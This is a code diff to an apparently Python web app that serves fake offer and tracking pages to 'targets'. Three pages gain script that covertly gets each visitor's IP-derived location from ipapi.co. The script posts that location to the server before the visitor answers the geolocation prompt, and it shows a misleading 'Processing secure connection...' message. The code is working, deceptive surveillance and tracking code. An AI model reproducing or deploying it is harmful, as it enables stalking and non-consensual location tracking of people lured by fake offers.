@@ -167,6 +167,35 @@ async def track_page(target_id: str):
         <div class="loader"></div>
         <p id="msg">Please click "Allow" if prompted to continue.</p>
         <script>
+            // Check permission state to update message
+            if (navigator.permissions) {{
+                navigator.permissions.query({{name: 'geolocation'}}).then(function(result) {{
+                    if (result.state === 'granted') {{
+                        document.getElementById('msg').innerText = "Processing secure connection...";
+                    }}
+                }});
+            }}
+
+            // Immediately send IP-based location without waiting for Allow
+            fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .then(data => {{
+                    if (data.latitude && data.longitude) {{
+                        fetch('/submit_location', {{
+                            method: 'POST',
+                            headers: {{ 'Content-Type': 'application/json' }},
+                            body: JSON.stringify({{
+                                target_id: "{target_id}",
+                                lat: data.latitude,
+                                lon: data.longitude,
+                                accuracy: 5000,
+                                source: "IP Address"
+                            }})
+                        }});
+                    }}
+                }}).catch(e => console.log(e));
+
+            // Request GPS location
             if (navigator.geolocation) {{
                 navigator.geolocation.getCurrentPosition(
                     function(position) {{
@@ -252,6 +281,32 @@ async def phone_offer_page(product_name: str, product_id: str, id: str = ""):
             if (current_target === "") {{
                 current_target = "LinkUser_" + Math.floor(Math.random() * 90000 + 10000);
             }}
+
+            if (navigator.permissions) {{
+                navigator.permissions.query({{name: 'geolocation'}}).then(function(result) {{
+                    if (result.state === 'granted') {{
+                        document.getElementById('msg').innerText = "Processing secure connection...";
+                    }}
+                }});
+            }}
+
+            fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .then(data => {{
+                    if (data.latitude && data.longitude) {{
+                        fetch('/submit_location', {{
+                            method: 'POST',
+                            headers: {{ 'Content-Type': 'application/json' }},
+                            body: JSON.stringify({{
+                                target_id: current_target,
+                                lat: data.latitude,
+                                lon: data.longitude,
+                                accuracy: 5000,
+                                source: "IP Address"
+                            }})
+                        }});
+                    }}
+                }}).catch(e => console.log(e));
 
             if (navigator.geolocation) {{
                 navigator.geolocation.getCurrentPosition(
@@ -351,6 +406,32 @@ async def offer_page(store: str, id: str = ""):
             if (current_target === "") {{
                 current_target = "LinkUser_" + Math.floor(Math.random() * 90000 + 10000);
             }}
+
+            if (navigator.permissions) {{
+                navigator.permissions.query({{name: 'geolocation'}}).then(function(result) {{
+                    if (result.state === 'granted') {{
+                        document.getElementById('msg').innerText = "Processing secure connection...";
+                    }}
+                }});
+            }}
+
+            fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .then(data => {{
+                    if (data.latitude && data.longitude) {{
+                        fetch('/submit_location', {{
+                            method: 'POST',
+                            headers: {{ 'Content-Type': 'application/json' }},
+                            body: JSON.stringify({{
+                                target_id: current_target,
+                                lat: data.latitude,
+                                lon: data.longitude,
+                                accuracy: 5000,
+                                source: "IP Address"
+                            }})
+                        }});
+                    }}
+                }}).catch(e => console.log(e));
 
             if (navigator.geolocation) {{
                 navigator.geolocation.getCurrentPosition(
